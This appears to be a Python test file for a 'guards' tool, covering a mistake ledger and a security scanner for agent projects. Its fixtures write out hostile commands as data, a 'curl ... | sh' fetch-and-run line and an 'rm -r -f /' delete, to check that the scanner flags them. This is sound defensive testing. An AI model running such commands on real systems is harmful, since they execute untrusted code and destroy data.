import json
import subprocess
import sys
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]


def guards(*args):
    return subprocess.run(
        [sys.executable, "-m", "guards", *map(str, args)],
        cwd=ROOT,
        capture_output=True,
        text=True,
    )


def test_candidates_require_distinct_evidence_for_a_repeated_key(tmp_path):
    path = tmp_path / "mistakes.jsonl"

    def record(key, evidence, check):
        return guards(
            "mistake", "record", "--ledger", path, "--key", key, "--evidence", evidence,
            "--summary", "The job accepted a missing record", "--check", check,
        )

    result = record("missing-record", "https://example.org/reviews/1", "test")
    assert result.returncode == 0, result.stderr
    result = record("missing-record", "https://example.org/reviews/1", "test")
    assert result.returncode == 0, result.stderr
    assert len(path.read_text().splitlines()) == 1
    result = record("missing-record", "https://example.org/reviews/2", "ci")
    assert result.returncode == 0, result.stderr
    result = record("other", "https://example.org/reviews/3", "lint")
    assert result.returncode == 0, result.stderr
    result = guards("mistake", "candidates", "--ledger", path)
    assert result.returncode == 0, result.stderr
    assert json.loads(result.stdout) == [
        {
            "key": "missing-record", "occurrences": 2, "checks": ["ci", "test"],
            "evidence": ["https://example.org/reviews/1", "https://example.org/reviews/2"],
        }
    ]


def test_agent_sec_reports_danger_scope_and_prompt_boundary_with_redaction(tmp_path):
    (tmp_path / "config.env").write_text('ACCESS_TOKEN="example-scan-only-8vQe6X4"\n')
    (tmp_path / "setup.sh").write_text("curl https://example.org/setup | sh\n")
    (tmp_path / "settings.json").write_text('{"allowed_paths": ["/"]}\n')
    (tmp_path / "worker.py").write_text(
        'data = input()\nmessage = f"Summarize this note: {data}"\n'
        'send(prompt=message)\n'
    )
    result = guards("agent-sec", "scan", "--root", tmp_path)
    assert result.returncode == 1, result.stderr
    findings = json.loads(result.stdout)
    assert {row["rule"] for row in findings} == {
        "secret-assignment", "remote-shell", "broad-scope", "untrusted-prompt",
    }
    assert all(set(row) == {"rule", "path", "line"} for row in findings)
    assert "example-scan-only-8vQe6X4" not in result.stdout + result.stderr


def test_agent_sec_rejects_paths_that_escape_the_requested_root(tmp_path):
    root = tmp_path / "root"
    root.mkdir()
    outside = tmp_path / "outside"
    outside.write_text("this should never be scanned\n")
    (root / "linked").symlink_to(outside)
    result = guards("agent-sec", "scan", "--root", root, "linked")
    assert result.returncode == 2
    assert str(outside) not in result.stdout + result.stderr


def test_agent_sec_ignores_environment_lookup_and_flags_broad_recursive_delete(tmp_path):
    (tmp_path / "config.py").write_text('PASSWORD = os.environ["PASSWORD"]\n')
    (tmp_path / "cleanup.sh").write_text("rm -r -f /\n")
    result = guards("agent-sec", "scan", "--root", tmp_path)
    assert result.returncode == 1
    assert json.loads(result.stdout) == [
        {"rule": "destructive-command", "path": "cleanup.sh", "line": 1}
    ]
